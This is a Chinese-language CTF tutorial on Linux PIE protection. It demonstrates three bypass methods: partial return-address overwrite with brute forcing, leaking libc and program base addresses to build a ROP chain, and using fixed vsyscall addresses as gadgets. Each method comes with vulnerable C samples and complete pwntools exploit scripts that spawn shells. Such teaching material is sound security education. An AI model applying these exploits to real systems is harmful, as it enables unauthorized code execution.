> 原文链接: https://www.anquanke.com//post/id/177520 


# PIE保护详解和常用bypass手段


                                阅读量   
                                **423428**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t018ab05521b73ed822.jpg)](https://p0.ssl.qhimg.com/t018ab05521b73ed822.jpg)



什么是PIE呢？

PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题

下面通过一个例子来具体看一下PIE的效果

程序源码

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
void houmen()
`{`
    system("cat flag");
`}`
void vuln()
`{`
    char a[20];
    read(0,a,0x100);
    puts(a);
`}`
int main(int argc, char const *argv[])
`{`
    vuln();    
    return 0;
`}`
```

编译命令

```
gcc -fno-stack-protector -no-pie -s test.c -o test        #不开启PIE保护
```

不开启PIE保护的时候每次运行时加载地址不变

[![](https://s2.ax1x.com/2019/04/30/EGusk4.png)](https://s2.ax1x.com/2019/04/30/EGusk4.png)

开启PIE保护的时候每次运行时加载地址是随机变化的

[![](https://s2.ax1x.com/2019/04/30/EGu40O.png)](https://s2.ax1x.com/2019/04/30/EGu40O.png)

可以看出，如果一个程序开启了PIE保护的话，对于ROP造成很大影响，下面来讲解一下绕过PIE开启的方法



## 一、partial write

partial write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
void houmen()
`{`
    system("/bin/sh");
`}`
void vuln()
`{`
    char a[20];
    read(0,a,0x100);
    puts(a);
`}`
int main(int argc, char const *argv[])
`{`
    vuln();
    return 0;
`}`
# gcc -m32 -fno-stack-protector  -s test.c -o test
```

明显的栈溢出，通过gdb调试，直接来到vuln函数的ret处，可以看到houmen函数的地址和返回地址只有后几位不一样，那么我们覆盖地址的后4位即可

[![](https://s2.ax1x.com/2019/04/30/EGuTtH.png)](https://s2.ax1x.com/2019/04/30/EGuTtH.png)

由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf

exp：

```
#coding:utf-8
import random
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']

offset = 0x1c+4
list1 = ["x05","x15","x25","x35","x45","x55","x65","x75","x85","x95","xa5","xb5","xc5","xd5","xe5","xf5"]

while True:
    try:
        p = process("./test")
        payload = offset*"a"+"x7d"+random.sample(list1,1)[0]
        p.send(payload)
        p.recv()
        p.recv()
    except Exception as e:
        p.close()
        print e
```

可以很快的得到爆破的结果

[![](https://s2.ax1x.com/2019/04/30/EGub9A.png)](https://s2.ax1x.com/2019/04/30/EGub9A.png)



## 二、泄露地址

开启PIE保护的话影响的是程序加载的基地址，不会影响指令间的相对地址，因此我们如果能够泄露出程序或者libc的某些地址，我们就可以利用偏移来构造ROP

以国赛your_pwn作为例子，该程序保护全开，漏洞点在sub_B35函数，index索引没有控制大小，所以导致任意地址读和任意地址写。

泄露libc地址和泄露程序基地址的方法是在main函数栈帧中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出libc基地址和程序加载基地址

[![](https://s2.ax1x.com/2019/04/30/EGuLct.png)](https://s2.ax1x.com/2019/04/30/EGuLct.png)

exp：（需要用到LibcSearcher）

```
#coding:utf-8
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
r = process("./pwn")

__libc_start_main_231_offset = 0x150+296

r.recvuntil("name:")
r.sendline("radish")
__libc_start_main_231_addr = ""

# leak __libc_start_main_231_addr
for x in range(8):
    r.recvuntil("input indexn")
    r.sendline(str(__libc_start_main_231_offset+x))
    r.recvuntil("(hex) ")
    data = r.recvuntil("n",drop=True)
    if len(data)&gt;2:
        data = data[-2:]
    elif len(data)==1:
        data = "0"+data
    __libc_start_main_231_addr = data+__libc_start_main_231_addr
    r.recvuntil("input new value")
    r.sendline("0")
log.info("__libc_start_main_231_addr -&gt;&gt; "+__libc_start_main_231_addr)
__libc_start_main_231_addr = eval("0x"+__libc_start_main_231_addr)


push_r15_offset = 0x150+288
push_r15_addr = ""
for x in range(8):
    r.recvuntil("input indexn")
    r.sendline(str(push_r15_offset+x))
    r.recvuntil("(hex) ")
    data = r.recvuntil("n",drop=True)
    if len(data)&gt;2:
        data = data[-2:]
    elif len(data)==1:
        data = "0"+data
    push_r15_addr = data+push_r15_addr
    r.recvuntil("input new valuen")
    r.sendline("0")
log.info("push_r15_addr -&gt;&gt; "+push_r15_addr)
push_r15_addr = eval("0x"+push_r15_addr)

main_addr = push_r15_addr - 0x23b

# cover ret_addr
offset = 0x150+8
main_addr = p64(main_addr).encode("hex")
print main_addr
num = 0
for x in range(8):
    r.recvuntil("input indexn")
    r.sendline(str(offset+x))
    r.recvuntil("input new valuen")
    r.sendline(str(eval("0x"+main_addr[num:num+2])))
    print str(eval("0x"+main_addr[num:num+2]))
    num = num + 2

log.info("------------------- success cover! -------------------")
for x in range(41-24):
    r.recvuntil("input indexn")
    r.sendline("0")
    r.recvuntil("input new valuen")
    r.sendline("0")

r.recv()
r.sendline("yes")
r.recv()

log.info("------------------- ret main success ---------------")

pop_rdi_addr =  99+push_r15_addr

__libc_start_main_addr = __libc_start_main_231_addr-231
# libc = LibcSearcher("__libc_start_main",__libc_start_main_addr)
libc = ELF("./libc.so.6")
base_addr = __libc_start_main_addr-libc.symbols["__libc_start_main"]
print hex(base_addr)
system_addr = libc.symbols['system']+base_addr
bin_sh_addr = 0x000000000017d3f3+base_addr
log.info("system_addr: "+hex(system_addr))
log.info("bin_sh_addr: "+hex(bin_sh_addr))

payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode("hex")
print payload

r.sendline("radish")

num = 0
for x in range(0,24):
    r.recvuntil("input indexn")
    r.sendline(str(offset+x))
    r.recvuntil("input new valuen")
    r.sendline(str(eval("0x"+payload[num:num+2])))
    print str(eval("0x"+payload[num:num+2]))
    num = num + 2

log.info("------------------- cover payload success ---------------")
for x in range(41-24):
    r.recvuntil("input indexn")
    r.sendline("0")
    r.recvuntil("input new valuen")
    r.sendline("0")
r.recv()
#gdb.attach(r)
r.sendline("yes")
sleep(0.2)
r.interactive()
```



## 三、vdso/vsyscall

vsyscall是什么呢？

通过查阅资料得知，vsyscall是第一种也是最古老的一种用于加快系统调用的机制，工作原理十分简单，许多硬件上的操作都会被包装成内核函数，然后提供一个接口，供用户层代码调用，这个接口就是我们常用的int 0x80和syscall+调用号。

当通过这个接口来调用时，由于需要进入到内核去处理，因此为了保证数据的完整性，需要在进入内核之前把寄存器的状态保存好，然后进入到内核状态运行内核函数，当内核函数执行完的时候会将返回结果放到相应的寄存器和内存中，然后再对寄存器进行恢复，转换到用户层模式。

这一过程需要消耗一定的性能，对于某些经常被调用的系统函数来说，肯定会造成很大的内存浪费，因此，系统把几个常用的内核调用从内核中映射到用户层空间中，从而引入了vsyscall

通过命令“cat /proc/self/maps| grep vsyscall”查看，发现vsyscall地址是不变的

[![](https://s2.ax1x.com/2019/04/30/EGujnf.png)](https://s2.ax1x.com/2019/04/30/EGujnf.png)

使用gdb把vsyscall从内存中dump下来，拖到IDA中分析

[![](https://s2.ax1x.com/2019/04/30/EGuxHS.png)](https://s2.ax1x.com/2019/04/30/EGuxHS.png)

可以看到里面有三个系统调用，根据对应表得出这三个系统调用分别是__NR_gettimeofday、__NR**time、**_NR_getcpu

```
#define __NR_gettimeofday 96
#define __NR_time 201
#define __NR_getcpu 309
```

这三个都是系统调用，并且也都是通过syscall来实现的，这就意味着我们有了一个可控的syscall

拿一道CTF真题来做为例子（1000levels）：

程序具体漏洞这里不再过多的解释，只写涉及到利用vsyscall的步骤

当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错

所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800

程序开启了PIE，无法从该程序中直接跳转到main函数或者其他地址，因此可以使用vsyscall来充当gadget，使用它的原因也是因为它在内存中的地址是不变的

#### <a class="reference-link" name="exp%EF%BC%9A"></a>exp：

```
from pwn import * 

io =process('1000levels', env=`{`'LD_PRELOAD':'./libc.so.6'`}`)

libc_base = -0x456a0                    #减去system函数离libc开头的偏移
one_gadget_base = 0x45526            #加上one gadget rce离libc开头的偏移
vsyscall_gettimeofday = 0xffffffffff600000
def answer():
    io.recvuntil('Question: ') 
    answer = eval(io.recvuntil(' = ')[:-3])
    io.recvuntil('Answer:')
    io.sendline(str(answer))
io.recvuntil('Choice:')
io.sendline('2')
io.recvuntil('Choice:')
io.sendline('1')    
io.recvuntil('How many levels?')
io.sendline('-1')
io.recvuntil('Any more?')

io.sendline(str(libc_base+one_gadget_base))
for i in range(999):
    log.info(i)
    answer()

io.recvuntil('Question: ')

io.send('a'*0x38 + p64(vsyscall_gettimeofday)*3) 
io.interactive()
```

vdso好处是其中的指令可以任意执行，不需要从入口开始，坏处是它的地址是随机化的，如果要利用它，就需要爆破它的地址，在64位下需要爆破的位数很多，但是在32位下需要爆破的字节数就很少。



## 个人感悟：

在之前比赛中遇到开启PIE的程序时，脑子里没有一些特定的技术手法来绕过，最起码学了这个之后，在以后遇到类似问题的时候能想到用这些方法绕过。

希望我在安全这条路上越走越远！本文如有不妥之处，敬请斧正。



## 参考文献：

[hitb2017 – 1000levels [Study]](https://1ce0ear.github.io/2017/12/22/vsyscalls/)
